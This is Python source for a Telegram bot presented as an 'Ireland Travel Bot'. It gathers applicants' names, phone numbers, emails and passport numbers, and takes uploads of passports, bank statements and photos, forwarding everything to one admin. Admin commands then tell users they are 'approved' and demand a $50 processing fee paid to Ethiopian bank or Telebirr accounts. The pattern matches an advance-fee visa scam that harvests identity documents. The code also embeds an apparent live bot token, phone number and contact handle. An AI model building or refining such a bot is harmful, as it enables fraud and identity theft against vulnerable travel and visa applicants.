from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command
from aiogram.filters import CommandStart
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Document, PhotoSize
import asyncio

TOKEN = "8887045721:AAEDMOjQwgjg_N8vpuiJcnO-2M1eur314GU"
ADMIN_ID = 6833909394

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
@dp.message(CommandStart())
async def start(message: Message):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📄 Apply Now")],
            [KeyboardButton(text="📋 Requirements")],
            [KeyboardButton(text="📤 Upload Documents")],
            [KeyboardButton(text="📞 Support")]
        ],
        resize_keyboard=True
    )

    await message.answer(
        "🇮🇪 Welcome to Ireland Travel Bot\nChoose an option:",
        reply_markup=keyboard
    )
    user_data = {}
@dp.message(F.text == "📄 Apply Now")
async def apply(message: Message, state: FSMContext):
    await state.set_state(Form.name)
    await message.answer("📝 Enter your FULL NAME:")
@dp.message(Command("success"))
async def success_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()

    if len(parts) != 2:
        await message.answer("Usage: /success USER_ID")
        return

    user_id = int(parts[1])

    await bot.send_message(
        user_id,
        "✅ Congratulations!\n\nYour application has been approved."
    )

    await message.answer("✅ Success message sent.")
@dp.message(F.text == "📤 Upload Documents")
async def upload(message: Message):
    await message.answer(
        "📤 Please send your documents here.\n\n"
        "Accepted:\n"
        "• Passport\n"
        "• CV / Resume\n"
        "• Bank Statement\n"
        "• Education Documents\n"
        "• Passport Size Photo"
    )
@dp.message(F.document)
async def receive_document(message: Message):
    print("DOCUMENT RECEIVED")

    await bot.send_document(
        ADMIN_ID,
        message.document.file_id,
        caption=f"📥 Document from: {message.from_user.full_name}"
    )

    await message.answer(
    "✅ Documents received successfully!\n\n"
    "⏳ Our team will review your documents.\n"
    "📞 You will receive a response within 12 hours.\n\n"
    "📤 If you forgot any document, you can upload it again anytime."
)
@dp.message(F.photo)
async def receive_photo(message: Message):
    await bot.send_photo(
        ADMIN_ID,
        message.photo[-1].file_id,
        caption=f"📷 Photo from: {message.from_user.full_name}"
    )

    await message.answer(
    "✅ Documents received successfully!\n\n"
    "⏳ Our team will review your documents.\n"
    "📞 You will receive a response within 12 hours.\n\n"
    "📤 If you forgot any document, you can upload it again anytime."
)
@dp.message(Command("success"))
async def success(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split()

    if len(args) < 2:
        await message.answer("❌ Usage: /success user_id")
        return

    user_id = args[1]

    await bot.send_message(
    user_id,
    "🎉 CONGRATULATIONS!\n\n"
    "✅ Your application has been approved.\n\n"
    "💳 Initial Processing Fee: $50\n\n"
    "Payment Methods:\n\n"
    "📱 Telebirr: 09XXXXXXXX\n\n"
    "🏦 Commercial Bank of Ethiopia\n"
    "Account Name: YOUR NAME\n"
    "Account Number: XXXXXXXXXX\n\n"
    "🏦 Bank of Abyssinia\n"
    "Account Name: YOUR NAME\n"
    "Account Number: XXXXXXXXXX\n\n"
    "📸 After payment, send your payment receipt through this bot.\n\n"
    "📞 Support: @Dselft"
)
@dp.message(Command("error"))
async def error(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split()

    if len(args) < 2:
        await message.answer("❌ Usage: /error user_id")
        return

    user_id = args[1]

    await bot.send_message(user_id, "❌ Your application was Rejected!")
    await message.answer("✔ ERROR sent")
@dp.message(Command("payment"))
async def payment_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()

    if len(parts) != 2:
        await message.answer("Usage: /payment USER_ID")
        return

    user_id = int(parts[1])

    await bot.send_message(
        user_id,
        "✅ Payment Confirmed!\n\n"
        "💳 We have received your payment.\n"
        "📄 Your application is now being processed.\n"
        "⏳ We will contact you with the next steps."
    )

    await message.answer("✅ Payment confirmation sent.")
class Form(StatesGroup):
    name = State()
    phone = State()
    email = State()
    passport = State()


@dp.message(Form.name)
async def name_step(message: Message, state: FSMContext):
    await state.update_data(name=message.text)
    await state.set_state(Form.phone)
    await message.answer("📞 Enter your PHONE NUMBER:")


@dp.message(Form.phone)
async def phone_step(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(Form.email)
    await message.answer("📧 Enter your EMAIL:")


@dp.message(Form.email)
async def email_step(message: Message, state: FSMContext):
    await state.update_data(email=message.text)
    await state.set_state(Form.passport)
    await message.answer("📘 Enter your PASSPORT NUMBER:")


@dp.message(F.text == "📋 Requirements")
async def requirements(message: Message):
    await message.answer(
        "🇮🇪 Ireland Travel Requirements\n\n"
        "📄 Valid Passport\n"
        "💰 Bank Statement\n"
        "🎓 Education Documents\n"
        "📷 Passport Size Photo\n"
        "📧 Active Email Address\n"
        "📞 Active Phone Number\n\n"
        "📤 After preparing all documents, click 'Upload Documents'."
    )
@dp.message(F.text == "📞 Support")
async def support(message: Message):
    await message.answer(
        "📞 Ireland Travel Support\n\n"
        "👤 Support Team\n"
        "📱 Telegram: @Dselft\n"
        "☎️ Phone: +251921783429\n"
        "🕒 Working Hours: 8:00 AM - 6:00 PM\n\n"
        "💬 We will respond as soon as possible."
    )
@dp.message(Form.passport)
async def passport_step(message: Message, state: FSMContext):
    data = await state.get_data()

    await message.answer("✅ Application submitted successfully!")

    await bot.send_message(
        ADMIN_ID,
        f"📥 NEW APPLICATION\n\n"
        f"🆔 User ID: {message.from_user.id}\n"
        f"👤 Name: {data['name']}\n"
        f"📞 Phone: {data['phone']}\n"
        f"📧 Email: {data['email']}\n"
        f"📘 Passport: {message.text}"
    )
    await state.clear()
async def main():
    print("BOT STARTING...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())